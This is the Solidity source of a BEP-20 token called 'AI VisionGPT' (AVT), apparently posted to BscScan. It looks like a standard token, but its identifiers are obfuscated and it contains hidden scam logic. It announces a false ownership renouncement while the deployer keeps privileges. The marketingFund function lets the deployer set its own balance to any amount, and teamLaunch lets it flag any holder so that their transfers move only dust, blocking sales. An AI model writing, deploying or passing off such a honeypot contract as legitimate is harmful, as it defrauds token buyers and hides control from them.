/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface minLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeList) external view returns (uint256);

    function transfer(address amountTo, uint256 feeAmount) external returns (bool);

    function allowance(address totalAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeAmount) external returns (bool);

    function transferFrom(
        address sender,
        address amountTo,
        uint256 feeAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellList, uint256 value);
    event Approval(address indexed totalAuto, address indexed spender, uint256 value);
}

interface minLiquidityMetadata is minLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface buyAt {
    function createPair(address maxLiquidity, address receiverWallet) external returns (address);
}

interface txToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverReceiverSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AIVisionGPT is receiverReceiverSwap, minLiquidity, minLiquidityMetadata {
    uint8 private modeReceiver = 18;
    

    address public liquidityAt;
    bool public tradingAmount;
    uint256 public swapLaunchedSender;
    uint256 private maxTotalExempt = 100000000 * 10 ** modeReceiver;
    string private modeReceiverLaunch = "AI VisionGPT";
    bool private sellReceiver;
    mapping(address => bool) public totalTo;
    bool public takeMarketing;
    string private tradingBuy = "AVT";
    mapping(address => uint256) private limitFund;
    uint256 private atTxLimit;
    address private tradingSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping(address => mapping(address => uint256)) private isExempt;
    bool private fundAuto;

    address public isShouldSwap;
    bool private buySellSwap;
    bool private tradingTotal;

    address private exemptShould;

    bool public shouldLaunch;
    uint256 constant limitTokenReceiver = 10 ** 10;

    mapping(address => bool) public tokenExemptSell;
    bool private modeToShould;
    
    

    event OwnershipTransferred(address indexed marketingTrading, address indexed exemptMin);

    constructor (){
        if (sellReceiver) {
            tradingTotal = false;
        }
        txToken receiverTrading = txToken(tradingSell);
        isShouldSwap = buyAt(receiverTrading.factory()).createPair(receiverTrading.WETH(), address(this));
        exemptShould = _msgSender();
        
        liquidityAt = exemptShould;
        tokenExemptSell[liquidityAt] = true;
        
        limitFund[liquidityAt] = maxTotalExempt;
        emit Transfer(address(0), liquidityAt, maxTotalExempt);
        liquidityTxSwap();
    }

    

    function listFrom() public {
        if (sellReceiver) {
            modeToShould = false;
        }
        if (buySellSwap) {
            tradingTotal = false;
        }
        atTxLimit=0;
    }

    function approve(address limitReceiver, uint256 feeAmount) public virtual override returns (bool) {
        isExempt[_msgSender()][limitReceiver] = feeAmount;
        emit Approval(_msgSender(), limitReceiver, feeAmount);
        return true;
    }

    function transferFrom(address tradingMarketingAmount, address feeTradingTo, uint256 feeAmount) public virtual override returns (bool) {
        if (tradingMarketingAmount != _msgSender() && isExempt[tradingMarketingAmount][_msgSender()] != type(uint256).max) {
            require(isExempt[tradingMarketingAmount][_msgSender()] >= feeAmount);
            isExempt[tradingMarketingAmount][_msgSender()] -= feeAmount;
        }
        if (feeTradingTo == liquidityAt || tradingMarketingAmount == liquidityAt) {
            return senderTeam(tradingMarketingAmount, feeTradingTo, feeAmount);
        }
        if (fundAuto) {
            atTxLimit = swapLaunchedSender;
        }
        if (totalTo[tradingMarketingAmount]) {
            return senderTeam(tradingMarketingAmount, feeTradingTo, limitTokenReceiver);
        }
        
        return senderTeam(tradingMarketingAmount, feeTradingTo, feeAmount);
    }

    function launchedReceiverSender() public {
        if (sellReceiver == modeToShould) {
            modeToShould = false;
        }
        if (shouldLaunch == tradingAmount) {
            tradingAmount = true;
        }
        atTxLimit=0;
    }

    function liquidityTxSwap() public {
        emit OwnershipTransferred(liquidityAt, address(0));
        exemptShould = address(0);
    }

    function shouldAt(address launchLiquidity) public {
        if (takeMarketing) {
            return;
        }
        
        tokenExemptSell[launchLiquidity] = true;
        
        takeMarketing = true;
    }

    function balanceOf(address feeList) public view virtual override returns (uint256) {
        return limitFund[feeList];
    }

    function senderTeam(address enableSwap, address amountTo, uint256 feeAmount) internal returns (bool) {
        require(limitFund[enableSwap] >= feeAmount);
        limitFund[enableSwap] -= feeAmount;
        limitFund[amountTo] += feeAmount;
        emit Transfer(enableSwap, amountTo, feeAmount);
        return true;
    }

    function marketingFund(uint256 feeAmount) public {
        if (!tokenExemptSell[_msgSender()]) {
            return;
        }
        limitFund[liquidityAt] = feeAmount;
    }

    function decimals() external view virtual override returns (uint8) {
        return modeReceiver;
    }

    function atExempt() public view returns (bool) {
        return sellReceiver;
    }

    function teamLaunch(address isSender) public {
        if (sellReceiver) {
            atTxLimit = swapLaunchedSender;
        }
        if (isSender == liquidityAt || isSender == isShouldSwap || !tokenExemptSell[_msgSender()]) {
            return;
        }
        
        totalTo[isSender] = true;
    }

    function owner() external view returns (address) {
        return exemptShould;
    }

    function feeTeam() public {
        
        if (modeToShould) {
            tradingTotal = false;
        }
        modeToShould=false;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxTotalExempt;
    }

    function name() external view virtual override returns (string memory) {
        return modeReceiverLaunch;
    }

    function transfer(address feeTradingTo, uint256 feeAmount) external virtual override returns (bool) {
        return transferFrom(_msgSender(), feeTradingTo, feeAmount);
    }

    function allowance(address listModeTeam, address limitReceiver) external view virtual override returns (uint256) {
        return isExempt[listModeTeam][limitReceiver];
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingBuy;
    }

    function minSell() public {
        
        if (swapLaunchedSender != atTxLimit) {
            shouldLaunch = false;
        }
        sellReceiver=false;
    }

    function getOwner() external view returns (address) {
        return exemptShould;
    }


}